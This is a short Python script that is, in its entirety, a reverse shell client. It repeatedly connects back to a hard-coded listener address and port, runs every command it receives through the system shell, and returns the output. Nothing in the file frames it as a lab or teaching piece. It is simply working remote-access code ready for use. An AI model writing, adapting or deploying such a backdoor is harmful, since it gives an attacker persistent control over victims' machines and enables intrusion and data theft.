#!/usr/local/bin/python3
import subprocess
import time
import socket
import os

# Check version
import sys
if sys.version[0] == '3':
    print("This script should be executed with python 2")
    sys.exit(1)

# PARAMS
LHOST = "192.168.86.30"
LPORT = 35843
SLEEP = 100

def response_prefix(msg):
    msg = "<{}>\n{}".format(os.getcwd(), msg)
    return msg

def command_filters(command):
    command.replace(' .. ', os.path.abspath(os.path.dirname(os.getcwd())))
    command.replace(' . ', os.path.abspath(os.getcwd()))
    return command

def get_cmd_args(cmd, ix):
    return cmd.split(' ')[ix]


while True:

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    while True:
        try:
            s.connect((LHOST, LPORT))
        except:
            time.sleep(SLEEP)
        else:
            break

    s.send("EHLO".encode('utf-8'))

    exit = False
    while not exit:
        try:
            data = s.recv(1024)
        except:
            break
        cmd = data.decode('utf-8')
        cmd = cmd.strip()
        cmd = command_filters(cmd)
        if cmd == 'exit':
            break
        try:
            if cmd[:2] == 'cd':
                path = get_cmd_args(cmd, 1)
                if path == '..': path = os.path.abspath(os.path.dirname(os.getcwd()))

                os.chdir(path)
            r = subprocess.Popen(data[:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                 stdin=subprocess.PIPE)
            output_bytes = r.stdout.read()
            output_msg   = response_prefix(output_bytes.decode('utf-8'))
        except Exception as e:
            s.send(str(e).encode('utf-8'))
        else:
            s.send(output_msg.encode('utf-8'))

    s.close()
